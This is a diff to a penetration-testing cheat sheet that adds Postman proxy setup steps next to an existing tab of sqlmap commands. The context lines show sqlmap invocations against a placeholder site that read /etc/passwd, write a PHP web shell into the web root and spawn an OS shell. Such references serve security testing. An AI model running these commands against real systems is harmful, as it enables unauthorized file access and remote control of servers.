@@ -66,10 +66,6 @@ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
 **How to commit changes from local machine**
 {% endtab %}
 
-{% tab title="Postman" %}
-
-{% endtab %}
-
 {% tab title="SQLmap" %}
 | Command                                                                                                                   | Description                                                 |
 | ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
@@ -98,6 +94,24 @@ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
 | `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
+{% endtab %}
+
+{% tab title="Postman" %}
+**Setup**
+
+1. Set manual upstream proxy (Burp/ZAP)
+2. Save first successful request as new collection
+3. Highlight base URL and right-click "set as variable" and select collection scope
+4. Set other common URLs for testing as different variables
+5. Verify new variables by hovering over Collection>"more actions" dropdown menu> Variables tab
+
+**Query Parameters**
+
+1. Name and Save new request to corresponding collection
+
+(Optional) Modify key and value pair `{{baseURL}}?key=value`
+
+**Path Variables**
 {% endtab %}
 {% endtabs %}
 
